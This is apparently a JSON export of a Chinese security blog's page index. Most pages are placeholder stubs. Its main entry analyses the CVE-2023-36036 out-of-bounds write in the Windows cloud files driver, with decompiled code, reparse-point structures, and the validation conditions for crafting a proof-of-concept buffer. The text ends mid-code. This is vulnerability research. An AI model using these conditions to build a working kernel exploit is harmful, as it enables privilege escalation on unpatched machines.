[{"uri":"https://www.ch35tnut.site/zh-cn/vulnerability/windows-clfs-eop/","title":"Windows CLFS EoP","tags":[],"description":"","content":"Windows CLFS 漏洞概览 序号 漏洞名 编号 类型 2 windows CLFS 权限提升漏洞 CVE-2023-28252 权限提升 1 windows CLFS 权限提升漏洞 CVE-2022-37969 权限提升 "},{"uri":"https://www.ch35tnut.site/zh-cn/research/windows/","title":"Windows","tags":[],"description":"","content":"Chapter X Some Chapter title Lorem Ipsum.\n"},{"uri":"https://www.ch35tnut.site/zh-cn/research/protocol/ntlm/","title":"Ntlm 协议","tags":[],"description":"","content":"Chapter X Some Chapter title Lorem Ipsum.\n"},{"uri":"https://www.ch35tnut.site/zh-cn/research/protocol/","title":"协议","tags":[],"description":"","content":"Chapter X Some Chapter title Lorem Ipsum.\n"},{"uri":"https://www.ch35tnut.site/zh-cn/research/web/","title":"Web","tags":[],"description":"","content":"web Web安全研究相关\n"},{"uri":"https://www.ch35tnut.site/zh-cn/research/code-audit/","title":"代码审计","tags":[],"description":"","content":"代码审计 "},{"uri":"https://www.ch35tnut.site/zh-cn/research/protocol/kerberos/kerberos-in-windows/","title":"Windows中的kerberos协议","tags":[],"description":"","content":"Chapter X Some Chapter title Lorem Ipsum.\n"},{"uri":"https://www.ch35tnut.site/zh-cn/research/protocol/kerberos/","title":"Kerberos 协议","tags":[],"description":"","content":"kerberos协议研究 "},{"uri":"https://www.ch35tnut.site/zh-cn/research/windows/dll-inject/","title":"Dll注入","tags":[],"description":"","content":"Dll注入研究 "},{"uri":"https://www.ch35tnut.site/zh-cn/misc/tunnel/transport-layer/socks/","title":"Socks协议","tags":[],"description":"","content":"Chapter X Some Chapter title Lorem Ipsum.\n"},{"uri":"https://www.ch35tnut.site/zh-cn/misc/tunnel/","title":"隧道","tags":[],"description":"","content":"Chapter X Some Chapter title Lorem Ipsum.\n"},{"uri":"https://www.ch35tnut.site/zh-cn/misc/tunnel/application-layer/","title":"应用层隧道","tags":[],"description":"","content":"Chapter X Some Chapter title Lorem Ipsum.\n"},{"uri":"https://www.ch35tnut.site/zh-cn/misc/tunnel/transport-layer/","title":"传输层隧道","tags":[],"description":"","content":"Chapter X Some Chapter title Lorem Ipsum.\n"},{"uri":"https://www.ch35tnut.site/zh-cn/misc/tunnel/network-layer/","title":"网络层隧道","tags":[],"description":"","content":"Chapter X Some Chapter title Lorem Ipsum.\n"},{"uri":"https://www.ch35tnut.site/zh-cn/research/","title":"安全研究","tags":[],"description":"","content":"安全研究 记录安全研究相关文章\n"},{"uri":"https://www.ch35tnut.site/zh-cn/research/windows/pe/","title":"Pe","tags":[],"description":"","content":"Chapter X Some Chapter title Lorem Ipsum.\n"},{"uri":"https://www.ch35tnut.site/zh-cn/vulnerability/","title":"漏洞分析","tags":[],"description":"","content":"漏洞分析 一些漏洞分析文章。\n序号 漏洞名 编号 类型 状态 42 41 40 39 38 37 36 35 34 33 32 31 30 ☐ 29 Windows 云文件迷你过滤驱动权限提升漏洞 CVE-2023-36036 权限提升 ✓ 28 wordpad 信息泄露漏洞 CVE-2023-36563 信息泄露 ✓ 27 squid 拒绝服务漏洞 拒绝服务 ✓ 26 Citrix Gateway 信息泄露漏洞 CVE-2023-4966 信息泄露 ✓ 25 http2 快速重置攻击 CVE-2023-44487 拒绝服务 ✓ 24 curl堆溢出漏洞 CVE-2023-38545 拒绝服务 ✓ 23 瑞友天翼 远程代码执行漏洞 代码执行 ✓ 22 libwebp 远程代码执行漏洞 CVE-2023-4863 代码执行 ✗ 21 jumpserver 任意密码重置漏洞 CVE-2023-42820 密码重置 ✓ 20 Winrar 代码执行漏洞 CVE-2023-38831 代码执行 ✓ 19 windows 错误报告服务代码执行漏洞 CVE-2023-36874 权限提升 ✓ 18 Windows ICS 权限提升漏洞 CVE-2023-38148 代码执行 ✓ 17 Cirtix Gateway RCE CVE-2023-3519 代码执行 ✓ 16 Openfire 身份认证绕过漏洞 CVE-2023-32315 身份认证绕过 ✗ 15 Smartbi RCE QVD-2023-5326 代码执行 ✓ 14 Windows CLFS 权限提升漏洞系列 权限提升 ✗ 13 gitlab 目录穿越漏洞 CVE-2023-2825 信息泄露 ✓ 12 zero logon分析 CVE-2020-1472 权限提升 ✓ 11 windows http.sys 权限提升漏洞 CVE-2023-23410 权限提升 ✓ 10 TerraMaster TOS代码执行漏洞 CVE-2022-24990 代码执行 ✗ 9 PgAdmin 代码执行漏洞 CVE-2022-4223 代码执行 ✓ 8 sudo权限提升漏洞 CVE-2021-3156 权限提升 ✗ 7 Minio信息泄露漏洞 CVE-2023-28432 信息泄露 ✓ 6 Strapi 代码执行漏洞链 代码执行 ✗ 5 Outlook 权限提升漏洞 CVE-2023-23397 权限提升 ✓ 4 OWASSRF 和 TabShell分析 CVE-2022-41080 CVE-2022-41076 代码执行 ✗ 3 proxy not shell 漏洞链 CVE-2022-41040 CVE-2022-41082 代码执行 ✗ 2 proxy shell 漏洞链 CVE-2021-34473 CVE-2021-34523 CVE-2021-31207 代码执行 ✗ 1 win32k 权限提升漏洞 CVE-2021-40449 权限提升 ✓ "},{"uri":"https://www.ch35tnut.site/zh-cn/","title":"首页","tags":[],"description":"","content":"学习记录 记录一些平时学习和生活的日常。\n11-20至11-25\r| 7 days ago\r分析了在野利用的 CVE-2023-36036 Windows Cloud Files Mini Filter Driver 权限提升漏洞\nWindows Cloud Files Mini Filter Driver 权限提升漏洞 2023\r10-31至11-01\r1 day | 27 days ago\r分析了在野利用的wordpad 信息泄露漏洞\nwordpad 信息泄露漏洞 2023\r10-19至10-25\r6 days | 39 days ago\r分析了两个漏洞\nCitrix 信息泄露漏洞 squid 拒绝服务漏洞 2023\r10-14至10-15\r1 day | 44 days ago\r复现分析了curl 堆溢出漏洞\ncurl堆溢出漏洞 2023\r10-12至10-13\r1 day | 46 days ago\r复现分析了http2 快速重置攻击\nhttp rapid reset ddos attack 2023\r09-19至09-19\r| 69 days ago\r把之前写的文章整理到了博客\nwindows 错误报告服务权限提升漏洞 winrar 代码执行漏洞 2023\r09-14至09-18\r4 days | 74 days ago\r分析了以下9月补丁日的CVE-2023-38148, 分析文章：\nwindows ics rce 2023\r07-24至07-27\r3 days | 126 days ago\r前几天搭建Citrix ADC环境，实在是太难搭了，最后还是选择从公网找了个环境打了一下payload，diff了以下补丁，写了一个分析，可惜不能本地调试，看起来写exp应该挺简单的。分析见\ncitrix adc rce 更新：搭建了调试环境，调试了一下，更新在原链接\n2023\r09-13至09-16\r3 days | 440 days ago\r这周再写一个基于rust的loader，写了一半发现加载的dll太多了，再想办法用动态加载的方式加载dll，感觉用rust做有点难。\n用rust的内联汇编获取到了kernel32.dll和ntdll.dll的基址，还要继续完善。\n2022\r09-10至09-12\r2 days | 443 days ago\r中秋节，在家摸了几天🐟，啥都没干\n2022\r09-05至09-09\r4 days | 448 days ago\r这周编译了wireshark 1.8.5，通过diff1.8.5和1.8.6的源码找出1.8.5里面的漏洞，见\nwireshark 1.8.5代码审计 2022\r09-03至09-04\r1 day | 450 days ago\r这两天，给hugo主题增加了timeline的shortcode，见\n增加timeline功能 2022\r08-29至09-02\r4 days | 455 days ago\r周内看了一个几百行的代码，见\rnews_server审计\n2022\r黑客精神：Open, Share, Free\n"},{"uri":"https://www.ch35tnut.site/zh-cn/dailylife/","title":"生活随笔","tags":[],"description":"","content":"Chapter X Some Chapter title Lorem Ipsum.\n"},{"uri":"https://www.ch35tnut.site/zh-cn/misc/","title":"杂项","tags":[],"description":"","content":"杂项 暂无\n"},{"uri":"https://www.ch35tnut.site/zh-cn/others/","title":"其他","tags":[],"description":"","content":"其他 "},{"uri":"https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-36036-windows-cloud-files-mini-filter-driver-eop/","title":"CVE-2023-36036 Windows Cloud Files Mini Filter Driver 权限提升漏洞分析","tags":["漏洞分析"],"description":"","content":"基本信息 Windows Cloud Files Mini Filter 驱动中存在越界写入漏洞，在解析Reparse point数据时，由于memcpy函数的长度参数用户可控，源内存可控，导致攻击者可以构造恶意结构并传递给Windows Cloud Files Mini Filter 驱动，造成越界写入，并在内核执行任意代码。\n影响版本 略\n环境搭建 Windows 10 23年10月补丁 技术分析\u0026amp;调试 cldflt.sys驱动中实现了云文件的各项功能，diff该驱动，修改函数如下：\n在HsmpRpiDecompressBuffer函数中有如下修改，对*(_WORD *)(a1 + 10)添加了一个判断，是否\u0026gt;0x4000，\n如果大于则抛出错误 0xC000CF02对应 STATUS_CLOUD_FILE_METADATA_CORRUPT\nhttps://endodermis59.rssing.com/chan-36587470/all_p6.html\nAI输出\nHsmpRpiDecompressBuffer函数的作用是解压压缩后的Reparse Point数据。 主要功能包括: 1. 校验传入数据的完整性和魔数是否正确 2. 如果数据被压缩,则根据原长度分配解压缓冲区 3. 调用RtlDecompressBuffer进行实际解压 4. 检查解压后数据长度是否匹配 5. 如果解压成功,返回解压后的数据 6. 否则返回错误码 所以它是一个典型的压缩数据解压函数,接收原始压缩数据,校验-\u0026gt;分配缓冲区-\u0026gt;解压-\u0026gt;返回解压后数据的过程。 通过解压让后续代码可以处理未压缩的Reparse Point数据,一般在需要提交/更新数据时会解压。 主要作用就是将压缩后的Reparse Point还原为可读的未压缩数据。 HsmpRpiDecompressBuffer由 HsmpRpReadBuffer调用\n__int64 __fastcall HsmpRpReadBuffer(PFLT_INSTANCE Instance, PFILE_OBJECT FileObject, unsigned __int16 **a3) { ... *a3 = 0i64; v6 = 1024; OutputBuffer = (unsigned __int16 *)ExAllocatePoolWithTag(PagedPool, 0x400ui64, 0x70527348u); v8 = OutputBuffer; ...... } LODWORD(v9) = HsmpRpiDecompressBuffer((__int64)v8, v6, a3); HsmDbgBreakOnStatus((unsigned int)v9); if ( (int)v9 \u0026lt; 0 ) { v16 = WPP_GLOBAL_Control; if ( WPP_GLOBAL_Control == (PDEVICE_OBJECT)\u0026amp;WPP_GLOBAL_Control || (HIDWORD(WPP_GLOBAL_Control-\u0026gt;Timer) \u0026amp; 1) == 0 || BYTE1(WPP_GLOBAL_Control-\u0026gt;Timer) \u0026lt; 2u ) { goto LABEL_8; } v17 = 20i64; goto LABEL_30; } if ( *a3 != v8 ) LABEL_8: ExFreePoolWithTag(v8, 0x70527348u); return (unsigned int)v9; } AI解释\n这段代码实现了解析和解压Reparse Point数据的功能: 1. 分配OutputBuffer内存用于读取Reparse数据。 2. 调用FltFsControlFile读取Reparse数据到OutputBuffer。 3. 如果读取失败,并且错误码表示buffer太小,则重新分配更大的buffer并重试读取。 4. 调用HsmpRpiDecompressBuffer对读取到的数据进行解压。 5. 如果解压成功,返回解压后的数据,否则返回错误码。 6. 释放原始数据内存。 7. 其中包含了详细的错误和日志记录逻辑。 所以总的来说,这段代码用于从文件系统读取Reparse Point数据,然后对数据进行解压和解析,最后返回解析后的数据。 主要功能聚焦在读取压缩数据并解压这块。 HsmpRpReadBuffer由 HsmpRpCommitNoLock和 HsmpSetupContexts调用。\nHsmpRpCommitNoLock解释如下\n这个C函数实现了HsmpRpCommitNoLock,它似乎是用于在没有锁的情况下提交页面重播(Page Replay)数据。 主要的逻辑如下: 1. 校验和准备输入数据 2. 分配内存池来存储提交的数据 3. 构建数据结构,填充各种元数据 4. 尝试压缩数据 5. 将数据写入文件 6. 清理临时数据结构和内存 具体来说,这个函数做了以下工作: 1. 验证输入参数的有效性 2. 为输出缓冲区分配内存 3. 构建输出缓冲区的数据结构 4. 填充输出缓冲区的头部 5. 将输入缓冲区的数据复制到输出缓冲区 6. 计算校验和 7. 尝试压缩输出缓冲区 8. 标记文件属性 9. 将输出缓冲区的数据写入文件 10. 重置文件属性 11. 释放临时缓冲区和内存 所以总的来说,这个函数的主要目的是准备并提交页面重播数据,同时处理必要的校验、压缩和清理工作。 在 HsmpRpCommitNoLock中有如下代码，可以看到在前面diff中出现的0x4000和0x3FFC，可以猜测漏洞产生于该函数中\nLABEL_156: PoolWithTag = (unsigned int *)ExAllocatePoolWithTag(PagedPool, 0x4000ui64, 0x70527348u); v142 = PoolWithTag; v11 = (char *)PoolWithTag; if ( PoolWithTag ) { memset(PoolWithTag, 0, 0x4000ui64); v57 = InputBuffer; v58 = v11 + 4; if ( v8 \u0026amp;\u0026amp; *((_WORD *)v8 + 7) \u0026gt; 0xAu ) v57 = *((_WORD *)v8 + 7); v59 = (unsigned int *)(v58 + 8); *((_WORD *)v58 + 6) = 0; v9 = (unsigned __int64)(v58 + 16); *((_WORD *)v58 + 7) = v57; *((_DWORD *)v58 + 2) = 8 * v57 + 16; *(_DWORD *)v58 = \u0026#39;pReF\u0026#39;; memset(v58 + 16, 0, 8i64 * v57); if ( *((_WORD *)v58 + 7) ) { v60 = *v59; if ( ((v60 + 3) \u0026amp; 0xFFFFFFFFFFFFFFFCui64) + 1 \u0026lt;= 0x3FFC )// 12 偏移 { *v59 = (v60 + 3) \u0026amp; 0xFFFFFFFC; if ( *(_WORD *)v9 ) *((_WORD *)v58 + 6) |= 1u; *(_WORD *)v9 = 7; LODWORD(v9) = 0; *((_WORD *)v58 + 9) = 1; v61 = *v59; *((_DWORD *)v58 + 5) = v61; v58[v61] = 1; 继续审查代码，发现在HsmpRpCommitNoLock中有如下代码，在do while循环中调用memmove函数时，传入的src来源于 HsmpRpReadBuffer解压后的element[10]数据，dst为ExAllocatePoolWithTag分配的大小为0x4000的内存。长度参数来源于ElementInfos[10].Length，不难看出由此可以造成越界写入，且用户可控。\nv32 = 0i64; if ( (v9 \u0026amp; 0x80000000) == 0i64 ) { v8 = (char *)P + 12; ... { if ( (_DWORD)v54 \u0026amp;\u0026amp; (_WORD)v55 ) v167 = \u0026amp;v8[v54]; else v167 = v32; ..... PoolWithTag = (unsigned int *)ExAllocatePoolWithTag(PagedPool, 0x4000ui64, 0x70527348u); v142 = PoolWithTag; v11 = (char *)PoolWithTag; if ( PoolWithTag ) { memset(PoolWithTag, 0, 0x4000ui64); v57 = InputBuffer; v58 = v11 + 4; if ( v8 \u0026amp;\u0026amp; *((_WORD *)v8 + 7) \u0026gt; 0xAu ) v57 = *((_WORD *)v8 + 7); v59 = (unsigned int *)(v58 + 8); *((_WORD *)v58 + 6) = 0; v9 = (unsigned __int64)(v58 + 16); *((_WORD *)v58 + 7) = v57; *((_DWORD *)v58 + 2) = 8 * v57 + 16; *(_DWORD *)v58 = \u0026#39;pReF\u0026#39;; memset(v58 + 16, 0, 8i64 * v57); ..... } *v59 += v109; ..... if ( *((_WORD *)v58 + 28) ) *((_WORD *)v58 + 6) |= 1u; *v59 = (v113 + 3) \u0026amp; 0xFFFFFFFC; .... *v59 += v114; ..... v117 = (char *)v167; v107 = (char *)Src; *v59 = (v118 + 3) \u0026amp; 0xFFFFFFFC; *((_WORD *)v58 + 32) = 17; *((_WORD *)v58 + 33) = v119; v121 = *v59; *((_DWORD *)v58 + 17) = v121; if ( \u0026amp;v58[v121] != v117 ) { memmove(\u0026amp;v58[v121], v117, v120); ...... v125 = 10; do { v126 = v125; *(HSM_ELEMENT_INFO *)\u0026amp;v58[8 * v125 + 16] = v124-\u0026gt;ElementInfos[v125]; memmove(\u0026amp;v58[*v59], (char *)v124 + v124-\u0026gt;ElementInfos[v125].Offset, v124-\u0026gt;ElementInfos[v125].Length); ++v125; *(_DWORD *)\u0026amp;v58[8 * v126 + 20] = *v59; *v59 += *(unsigned __int16 *)\u0026amp;v58[8 * v126 + 18]; } while ( v125 \u0026lt; v124-\u0026gt;NumberOfElements ); ... if ( v14 ) ExFreePoolWithTag(v14, 0x70527348u); if ( v11 ) ExFreePoolWithTag(v11, 0x70527348u); return (unsigned int)v9; } 搜索Reparse point RtlCompressBuffer，找到文章，根据\r文章 _REPARSE_DATA_BUFFER定义如下，可以知道传入 HsmpRpiDecompressBuffer的是 REPARSE_DATA_BUFFER，其中 ReparseTag为IO_REPARSE_TAG_CLOUD_3 值 0x9000301A 并且在结构体 HsmReparseBufferRaw的RawData成员中存储了由 (RtlCompressBuffer压缩的数据 HsmReparseBufferRaw\n// Handled by cldflt.sys!HsmpRpReadBuffer struct { USHORT Flags; // Flags (0x8000 = not compressed) USHORT Length; // Length of the data (uncompressed) BYTE RawData[1]; // To be RtlDecompressBuffer-ed } HsmReparseBufferRaw; _REPARSE_DATA_BUFFER定义\ntypedef struct _REPARSE_DATA_BUFFER { ULONG ReparseTag; // Reparse tag type USHORT ReparseDataLength; // Length of the reparse data USHORT Reserved; // Used internally by NTFS to store remaining length union { // Structure for IO_REPARSE_TAG_SYMLINK // Handled by nt!IoCompleteRequest struct { USHORT SubstituteNameOffset; USHORT SubstituteNameLength; USHORT PrintNameOffset; USHORT PrintNameLength; ULONG Flags; WCHAR PathBuffer[1]; /* Example of distinction between substitute and print names: // mklink /d ldrive c:\\ // SubstituteName: c:\\\\??\\ // PrintName: c:\\ */ } SymbolicLinkReparseBuffer; // Structure for IO_REPARSE_TAG_MOUNT_POINT // Handled by nt!IoCompleteRequest struct { USHORT SubstituteNameOffset; USHORT SubstituteNameLength; USHORT PrintNameOffset; USHORT PrintNameLength; WCHAR PathBuffer[1]; } MountPointReparseBuffer; // Structure for IO_REPARSE_TAG_WIM // Handled by wimmount!FPOpenReparseTarget-\u0026gt;wimserv.dll // (wimsrv!ImageExtract) struct { GUID ImageGuid; // GUID of the mounted VIM image BYTE ImagePathHash[0x14]; // Hash of the path to the file within the // image } WimImageReparseBuffer; // Structure for IO_REPARSE_TAG_WOF // Handled by FSCTL_GET_EXTERNAL_BACKING, FSCTL_SET_EXTERNAL_BACKING in // NTFS (Windows 10+) struct { //-- WOF_EXTERNAL_INFO -------------------- ULONG Wof_Version; // Should be 1 (WOF_CURRENT_VERSION) ULONG Wof_Provider; // Should be 2 (WOF_PROVIDER_FILE) //-- FILE_PROVIDER_EXTERNAL_INFO_V1 -------------------- ULONG FileInfo_Version; // Should be 1 (FILE_PROVIDER_CURRENT_VERSION) ULONG FileInfo_Algorithm; // Usually 0 (FILE_PROVIDER_COMPRESSION_XPRESS4K) } WofReparseBuffer; // Structure for IO_REPARSE_TAG_APPEXECLINK struct { ULONG StringCount; // Number of the strings in the StringList, separated // by \u0026#39;\\0\u0026#39; WCHAR StringList[1]; // Multistring (strings separated by \u0026#39;\\0\u0026#39;, // terminated by \u0026#39;\\0\\0\u0026#39;) } AppExecLinkReparseBuffer; // Structure for IO_REPARSE_TAG_WCI (0x80000018) struct { ULONG Version; // Expected to be 1 by wcifs.sys ULONG Reserved; GUID LookupGuid; // GUID used for lookup in wcifs!WcLookupLayer USHORT WciNameLength; // Length of the WCI subname, in bytes WCHAR WciName[1]; // The WCI subname (not zero terminated) } WcifsReparseBuffer; // Handled by cldflt.sys!HsmpRpReadBuffer struct { USHORT Flags; // Flags (0x8000 = not compressed) USHORT Length; // Length of the data (uncompressed) BYTE RawData[1]; // To be RtlDecompressBuffer-ed } HsmReparseBufferRaw; // Dummy structure struct { UCHAR DataBuffer[1]; } GenericReparseBuffer; } DUMMYUNIONNAME; } REPARSE_DATA_BUFFER, *PREPARSE_DATA_BUFFER; 在\r这个Github仓库中实现了对Reparse point的解析，其中定义了HSM_REPARSE_DATA\ntypedef struct _HSM_ELEMENT_INFO { USHORT Type; // Type of the element (?). One of HSM_ELEMENT_TYPE_XXX USHORT Length; // Length of the element data in bytes ULONG Offset; // Offset of the element data, relative to begin of HSM_DATA. Aligned to 4 bytes } HSM_ELEMENT_INFO, *PHSM_ELEMENT_INFO; typedef struct _HSM_DATA { ULONG Magic; // 0x70527442 (\u0026#39;pRtB\u0026#39;) for bitmap data, 0x70526546 (\u0026#39;FeRp\u0026#39;) for file data ULONG Crc32; // CRC32 of the following data (calculated by RtlComputeCrc32) ULONG Length; // Length of the entire HSM_DATA in bytes USHORT Flags; // HSM_DATA_XXXX USHORT NumberOfElements; // Number of elements HSM_ELEMENT_INFO ElementInfos[1]; // Array of element infos. There is fixed maximal items for bitmap and reparse data } HSM_DATA, *PHSM_DATA; typedef struct _HSM_REPARSE_DATA { USHORT Flags; // Lower 8 bits is revision (must be 1 as of Windows 10 16299) // Flags: 0x8000 = Data needs to be decompressed by RtlCompressBuffer USHORT Length; // Length of the HSM_REPARSE_DATA structure (including \u0026#34;Flags\u0026#34; and \u0026#34;Length\u0026#34;) HSM_DATA FileData; // HSM data } HSM_REPARSE_DATA, *PHSM_REPARSE_DATA; 对应在 REPARSE_DATA_BUFFER的偏移如下\n0:000\u0026gt; dt pa Local var @ 0xa8444fec08 Type _REPARSE_DATA_BUFFER* 0x000001e0`ef867690 +0x000 ReparseTag : 0x9000301a +0x004 ReparseDataLength : 0x4008 +0x006 Reserved : 0 +0x008 SymbolicLinkReparseBuffer : _REPARSE_DATA_BUFFER::\u0026lt;unnamed-tag\u0026gt;::\u0026lt;unnamed-type-SymbolicLinkReparseBuffer\u0026gt; +0x008 MountPointReparseBuffer : _REPARSE_DATA_BUFFER::\u0026lt;unnamed-tag\u0026gt;::\u0026lt;unnamed-type-MountPointReparseBuffer\u0026gt; +0x008 WimImageReparseBuffer : _REPARSE_DATA_BUFFER::\u0026lt;unnamed-tag\u0026gt;::\u0026lt;unnamed-type-WimImageReparseBuffer\u0026gt; +0x008 WofReparseBuffer : _REPARSE_DATA_BUFFER::\u0026lt;unnamed-tag\u0026gt;::\u0026lt;unnamed-type-WofReparseBuffer\u0026gt; +0x008 AppExecLinkReparseBuffer : _REPARSE_DATA_BUFFER::\u0026lt;unnamed-tag\u0026gt;::\u0026lt;unnamed-type-AppExecLinkReparseBuffer\u0026gt; +0x008 WcifsReparseBuffer : _REPARSE_DATA_BUFFER::\u0026lt;unnamed-tag\u0026gt;::\u0026lt;unnamed-type-WcifsReparseBuffer\u0026gt; +0x008 hsm_reparse_data : _HSM_REPARSE_DATA +0x008 GenericReparseBuffer : _REPARSE_DATA_BUFFER::\u0026lt;unnamed-tag\u0026gt;::\u0026lt;unnamed-type-GenericReparseBuffer\u0026gt; 0:000\u0026gt; dx -r1 (*((poc3!_HSM_REPARSE_DATA *)0x1e0ef867698)) (*((poc3!_HSM_REPARSE_DATA *)0x1e0ef867698)) [Type: _HSM_REPARSE_DATA] [+0x000] Flags : 0x8001 [Type: unsigned short] // 8 [+0x002] Length : 0x4008 [Type: unsigned short] // 10 [+0x004] FileData [Type: _HSM_DATA] // 12 0:000\u0026gt; dx -r1 (*((poc3!_HSM_DATA *)0x1e0ef86769c)) (*((poc3!_HSM_DATA *)0x1e0ef86769c)) [Type: _HSM_DATA] [+0x000] Magic : 0x70526546 [Type: unsigned long] // 12 [+0x004] Crc32 : 0x31e13b17 [Type: unsigned long] // 16 [+0x008] Length : 0x4004 [Type: unsigned long] // 20 [+0x00c] Flags : 0x2 [Type: unsigned short] // 24 [+0x00e] NumberOfElements : 0xb [Type: unsigned short] // 26 [+0x010] ElementInfos [Type: _HSM_ELEMENT_INFO [10) // 28 PoC构造\n将结构体导入到ida中，在HsmpRpCommitNoLock中首先对ReparseTag进行验证，而后将hsm_reparse_data和对应的长度导入到 HsmpRpValidateBuffer函数中验证。\nif ( (reparse_data_buffer-\u0026gt;ReparseTag \u0026amp; 0xFFFF0FFF) != dword_1C00235D0 ) { LODWORD(v9) = -1073688821; HsmDbgBreakOnStatus(3221278475i64); if ( WPP_GLOBAL_Control != (PDEVICE_OBJECT)\u0026amp;WPP_GLOBAL_Control \u0026amp;\u0026amp; (HIDWORD(WPP_GLOBAL_Control-\u0026gt;Timer) \u0026amp; 1) != 0 \u0026amp;\u0026amp; BYTE1(WPP_GLOBAL_Control-\u0026gt;Timer) \u0026gt;= 2u ) { WPP_SF_qiqDDd( WPP_GLOBAL_Control-\u0026gt;AttachedDevice, 2i64, v30, a2, *(_QWORD *)(v5 + 32), v29, dword_1C00235D0, reparse_data_buffer-\u0026gt;ReparseTag); } goto LABEL_8; } ReparseDataLength = reparse_data_buffer-\u0026gt;ReparseDataLength; v9 = (unsigned int)HsmpRpValidateBuffer(\u0026amp;reparse_data_buffer-\u0026gt;DUMMYUNIONNAME.hsm_reparse_data, ReparseDataLength); 在 HsmpRpValidateBuffer函数中对HSM_DATA结构体的一些字段做了如下校验。\nreparse_data_buffer-\u0026gt;ReparseDataLength \u0026gt; 4 reparse_data_buffer-\u0026gt;hsm_reparse_data.Flags=1 reparse_data_buffer-\u0026gt;hsm_reparse_data.FileData.Magic = \u0026lsquo;pReF\u0026rsquo; reparse_data_buffer-\u0026gt;hsm_reparse_data.FileData.Flags = 2, 并且reparse_data_buffer-\u0026gt;hsm_reparse_data.FileData.Crc32 == RtlComputeCrc32(0, (PUCHAR)\u0026amp;a1-\u0026gt;FileData.Length, v2 - 8 NumberOfElements 不为0，且最大为10，最后一个以NONE结尾 特别的，从如下代码中可以看到对ElementInfos[0]和ElementInfos[1]进行了校验，容易得出如下条件：\nNumberOfElements \u0026gt; 1 FileData.Length \u0026gt;= 0x20 `FileData.ElementInfos[1].Type == 0xA FileData.ElementInfos[1].Offset \u0026gt;= 8 * NumberOfElements + 16 \u0026amp;\u0026amp; FileData.ElementInfos[1].Offset \u0026lt; FileData.Length FileData.ElementInfos[1].Length == 4 FileData.ElementInfos[1].Length + FileData.ElementInfos[1].Offset \u0026lt; 65535 if ( (unsigned __int16)NumberOfElements \u0026gt; 1u \u0026amp;\u0026amp; (unsigned int)Length \u0026gt;= 0x20 \u0026amp;\u0026amp; (v22 = a1-\u0026gt;FileData.ElementInfos[1].Type, v22 \u0026lt; 0x12u) \u0026amp;\u0026amp; ((v23 = a1-\u0026gt;FileData.ElementInfos[1].Offset, !(_DWORD)v23) || v23 \u0026gt;= hsm_data_length) \u0026amp;\u0026amp; (unsigned int)v23 \u0026lt;= (unsigned int)Length \u0026amp;\u0026amp; (v24 = a1-\u0026gt;FileData.ElementInfos[1].Length, v24 \u0026lt;= (unsigned int)Length) \u0026amp;\u0026amp; v24 + (unsigned int)v23 \u0026gt;= (unsigned int)v23 \u0026amp;\u0026amp; v24 + (unsigned int)v23 \u0026lt;= (unsigned int)Length \u0026amp;\u0026amp; v22 == 10 \u0026amp;\u0026amp; v24 == 4 ) { v5 = *(ULONG *)((char *)\u0026amp;p_FileData-\u0026gt;Magic + v23); IsReparseBufferSupported = 0; } else { IsReparseBufferSupported = 0xC0000225; } 如下代码对ElementInfos[2]进行了校验，有如下：\nFileData.ElementInfos[2].Offset \u0026lt; FileData.Length FileData.ElementInfos[2].Length \u0026lt; FileData.Length FileData.ElementInfos[2].Type == 6 if ( (element_1_Data \u0026amp; 0x10) != 0 ) return IsReparseBufferSupported; v27 = a1-\u0026gt;FileData.Length; if ( v27 \u0026lt; 0x18 || (v28 = a1-\u0026gt;FileData.NumberOfElements, (unsigned __int16)v28 \u0026lt;= 2u) || v27 \u0026lt; 0x28 || (v29 = a1-\u0026gt;FileData.ElementInfos[2].Type, v29 \u0026gt;= 0x12u) || (v30 = a1-\u0026gt;FileData.ElementInfos[2].Offset, (_DWORD)v30) \u0026amp;\u0026amp; v30 \u0026lt; 8 * v28 + 16 || (unsigned int)v30 \u0026gt; v27 || (v31 = a1-\u0026gt;FileData.ElementInfos[2].Length, v31 \u0026gt; v27) || v31 + (unsigned int)v30 \u0026lt; (unsigned int)v30 || v31 + (unsigned int)v30 \u0026gt; v27 || v29 != 6 || (IsReparseBufferSupported = 0, v31 != 8) ) { IsReparseBufferSupported = 0xC0000225; } 后面还有一堆校验逻辑就不贴了。\n在 HsmpRpCommitNoLock中对 HsmpRpValidateBuffer返回值做了校验，如果IsReparseBufferSupported不为0则会进入报错逻辑，而在 HsmpRpValidateBuffer\nIsReparseBufferSupported = (unsigned int)HsmpRpValidateBuffer( \u0026amp;reparse_data_buffer-\u0026gt;DUMMYUNIONNAME.hsm_reparse_data, ReparseDataLength); HsmDbgBreakOnStatus(IsReparseBufferSupported); v32 = 0i64; if ( (IsReparseBufferSupported \u0026amp; 0x80000000) == 0i64 ) { ... } else { HsmDbgBreakOnCorruption(); if ( a4 == (_BYTE)v32 ) { if ( WPP_GLOBAL_Control != (PDEVICE_OBJECT)\u0026amp;WPP_GLOBAL_Control \u0026amp;\u0026amp; (HIDWORD(WPP_GLOBAL_Control-\u0026gt;Timer) \u0026amp; 1) != 0 在HsmpRpValidateBuffer中可以看到当通过第一次校验后，如果ElementInfos[1]的Data \u0026amp; 0x10 则会直接返回，此时IsReparseBufferSupported=0能通过校验。\nif ( (unsigned __int16)NumberOfElements \u0026gt; 1u \u0026amp;\u0026amp; (unsigned int)Length \u0026gt;= 0x20 \u0026amp;\u0026amp; (v22 = a1-\u0026gt;FileData.ElementInfos[1].Type, v22 \u0026lt; 0x12u) \u0026amp;\u0026amp; ((v23 = a1-\u0026gt;FileData.ElementInfos[1].Offset, !(_DWORD)v23) || v23 \u0026gt;= hsm_data_length) \u0026amp;\u0026amp; (unsigned int)v23 \u0026lt;= (unsigned int)Length \u0026amp;\u0026amp; (v24 = a1-\u0026gt;FileData.ElementInfos[1].Length, v24 \u0026lt;= (unsigned int)Length) \u0026amp;\u0026amp; v24 + (unsigned int)v23 \u0026gt;= (unsigned int)v23 \u0026amp;\u0026amp; v24 + (unsigned int)v23 \u0026lt;= (unsigned int)Length \u0026amp;\u0026amp; v22 == 10 \u0026amp;\u0026amp; v24 == 4 ) { element_1_Data = *(ULONG *)((char *)\u0026amp;p_FileData-\u0026gt;Magic + v23); IsReparseBufferSupported = 0; } else { IsReparseBufferSupported = 0xC0000225; } HsmDbgBreakOnStatus(IsReparseBufferSupported); if ( (IsReparseBufferSupported \u0026amp; 0x80000000) != 0 ) { v25 = WPP_GLOBAL_Control; if ( WPP_GLOBAL_Control == (PDEVICE_OBJECT)\u0026amp;WPP_GLOBAL_Control || (HIDWORD(WPP_GLOBAL_Control-\u0026gt;Timer) \u0026amp; 1) == 0 || 